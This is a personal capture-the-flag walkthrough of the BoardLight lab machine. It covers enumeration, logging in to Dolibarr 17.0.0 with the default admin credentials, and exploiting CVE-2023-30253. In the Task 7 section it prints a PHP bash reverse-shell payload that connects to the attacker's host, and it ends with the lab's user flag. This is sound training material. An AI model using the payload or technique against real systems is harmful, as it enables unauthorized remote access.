# Tasks

[**1. How many TCP ports are listening on BoardLight?**](#task-1)

[**2. What is the domain name used by the box?**](#task-2)

[**3. What is the name of the application running on a virtual host of board.htb?**](#task-3)

[**4. What version of Dolibarr is running on BoardLight?**](#task-4)

[**5. What is the default password for the admin user on Dolibarr?**](#task-5)

[**6. What is the 2023 CVE ID for an authenticated vulnerability that can lead to remote code execution in this version of Dolibarr?**](#task-6)

[**7. What user is the Dolibarr application running as on BoardLight?**](#task-7)

[**8. What is the full path of the file that contains the Dolibarr database connection information?**](#task-8)

[**9. User Flag**](#user-flag)

[**10. What is the name of the desktop environment installed on Boardlight?**](#task-10)

# Tools Used

- nmap
- ffuf
- linpeas

# Skills Used

- Subdomain enumeration

# Solutions

## Task 1

![image](https://github.com/user-attachments/assets/e3d552c9-d8c8-4713-a4c4-a3b963cbbc6c)

**Answer: 2**

## Task 2

![image](https://github.com/user-attachments/assets/2dac6e05-5e87-4fdc-badd-3d9dda4a345e)

It was right here lmao. No need for _ffuf_.

## Task 3

Used hint, told me to do _subdomain enumeration_, so:

![image](https://github.com/user-attachments/assets/dbed45d6-09f1-4416-9a11-88fbaf5958fa)

Putting that into ```/etc/hosts```, this is what I found:

![image](https://github.com/user-attachments/assets/6effb3ba-750f-4ab0-8a70-438af358f207)

**Answer: Dolibarr**

## Task 4

Reference the image in the previous task.

**Answer: 17.0.0**

## Task 5

I just searched on google ```dolibarr 17.0.0 default credentials``` and found a few contenders. Turns out ```admin:admin``` was it lmao.

![image](https://github.com/user-attachments/assets/fe22acf5-6597-4b98-92b4-59b80d55172b)

There was also ```admin:changeme123```, but that didn't work so yeah.

**Answer: admin**

## Task 6

![image](https://github.com/user-attachments/assets/53b2ee26-bf91-439c-8359-a89bdae02a44)

Standard google search for the _CVE_ lmao.

**Answer: CVE-2023-30253**

## Task 7

To exploit this, I ditched the earlier github repo I found since the _PoCs_ don't usually work for me cuz the domain's IP in these labs are usually stored locally on my machine lmao.

Anyways, I read [**this**](https://www.vicarius.io/vsociety/posts/exploiting-rce-in-dolibarr-cve-2023-30253-30254) instead though to better understand what to exploit. I just have to stick a _PHP Shell_ inside the _HTML 
page_ of a website I create in the admin page, but instead of ```<php ?>```, I need to use uppercase, so it looks like this instead: ```<PHP ?>```.

So, getting a revshell from _PentestMonkey_, here's what I did:

![image](https://github.com/user-attachments/assets/c065a992-434b-4c9f-b425-5871abdb0fe6)

For some reason _PentestMonkey_ can't spawn the shell :/

I'm going back to that git repo to see if I can use it now that I understand this _CVE_ more.

![image](https://github.com/user-attachments/assets/44d0824f-b5da-4e52-b5f3-769a63360c32)

This is what I added to the page content in the website I made:

```
<?pHp system(\"bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'\"); ?>
```

Be sure to make it properly though lmao, I forgot to make the right changes:

```
<?pHp system(\"bash -c 'bash -i >& /dev/tcp/[lhost]/[lport] 0>&1'\"); ?>
```

Now that that's done though, we FINALLY got a revshell.

![image](https://github.com/user-attachments/assets/fd182959-62ff-43eb-aaae-8a9551684118)

**Answer: www-data**

## Task 8

Before we proceed, I wanna stabilize the shell first (again), so:

```
Stabilization Process:

1. python3 -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm
3. CTRL + Z
4. stty raw -echo;fg
```

Now that that's done, let's get _linpeas_ in here.

Just a sidenote btw.

![image](https://github.com/user-attachments/assets/bf70644a-df9c-40ae-9790-21d3de0a4de7)

This here is interesting. I know the exploit we need is the first one suggested after reading the machine info beforehand, but for **beyond root**, it's interesting to see other attacks possible.

Anyways, let's continue to find that database connection file.

![image](https://github.com/user-attachments/assets/fa7f4e21-ce08-4862-97f9-2b1e188a6d94)

After seeing this, I'm pretty sure I need to look in ```/var/www/html/crm.board.htb/```. Let's continue looking for now before manually enumerating it.

A few minutes later, I couldn't find it. Time to enumerate it myself.

Found it.

**Answer: /var/www/html/crm.board.htb/htdocs/conf/conf.php**

## User Flag

![image](https://github.com/user-attachments/assets/23dfb627-ee8d-4f50-93e8-0495dbe2d6f3)

Found this in the _conf.php_ file, let's try using that.

![image](https://github.com/user-attachments/assets/6fd1a0cb-873a-47c2-99e5-e220c4d68cf5)

Yep.

**Answer: 6b51c3c25cea4fc82676d2ff5180940e**

## Task 10

TBC.
